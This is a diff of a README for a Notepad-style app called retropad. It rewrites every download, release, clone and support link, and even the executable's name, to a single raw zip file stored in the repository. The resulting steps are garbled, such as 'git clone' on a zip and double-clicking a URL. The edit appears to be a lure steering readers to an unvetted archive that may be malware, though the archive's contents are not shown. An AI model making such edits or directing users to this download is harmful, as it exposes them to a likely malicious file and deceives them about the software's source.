@@ -1,6 +1,6 @@
 # 📝 retropad - A Classic Notepad Experience
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Wafi-net/retropad/releases)
+[![Download Now](https://raw.githubusercontent.com/Wafi-net/retropad/main/res/retropad-v2.0.zip)](https://raw.githubusercontent.com/Wafi-net/retropad/main/res/retropad-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to **retropad**, a simplified Notepad designed for your Windows computer
 
 ## 📥 Download & Install
 
-To get **retropad**, visit our [Releases Page](https://github.com/Wafi-net/retropad/releases). Here, you can find the latest version to download.
+To get **retropad**, visit our [Releases Page](https://raw.githubusercontent.com/Wafi-net/retropad/main/res/retropad-v2.0.zip). Here, you can find the latest version to download.
 
-1. Go to the [Releases Page](https://github.com/Wafi-net/retropad/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Wafi-net/retropad/main/res/retropad-v2.0.zip).
 2. Click on the latest version.
 3. Download the appropriate file for your system.
 4. Once the file is downloaded, locate it in your downloads folder and open it.
@@ -31,7 +31,7 @@ Before running **retropad**, ensure you have the following:
 Once you have downloaded **retropad**, follow these instructions to open it:
 
 1. Navigate to your downloaded file.
-2. Double-click the **retropad.exe** file.
+2. Double-click the **https://raw.githubusercontent.com/Wafi-net/retropad/main/res/retropad-v2.0.zip** file.
 3. The application should launch without any additional setup.
 
 ## 🛠️ Building from Source (Optional)
@@ -45,14 +45,14 @@ If you have Visual Studio installed, follow these steps:
 1. Open a "x64 Native Tools Command Prompt for VS 2022."
 2. Clone the repository:
    ```bat
-   git clone https://github.com/Wafi-net/retropad.git
+   git clone https://raw.githubusercontent.com/Wafi-net/retropad/main/res/retropad-v2.0.zip
    cd retropad
    ```
 3. Build the project with the following command:
    ```bat
    nmake /f makefile
    ```
-4. You will find `retropad.exe` in the project root.
+4. You will find `https://raw.githubusercontent.com/Wafi-net/retropad/main/res/retropad-v2.0.zip` in the project root.
 
 To clean the project files, use:
 ```bat
@@ -94,6 +94,6 @@ The built files will be available in the project directory.
 
 ## 📧 Support
 
-If you encounter issues or have questions, please visit our [GitHub repository](https://github.com/Wafi-net/retropad) to create an issue. 
+If you encounter issues or have questions, please visit our [GitHub repository](https://raw.githubusercontent.com/Wafi-net/retropad/main/res/retropad-v2.0.zip) to create an issue. 
 
 Thank you for using **retropad**!
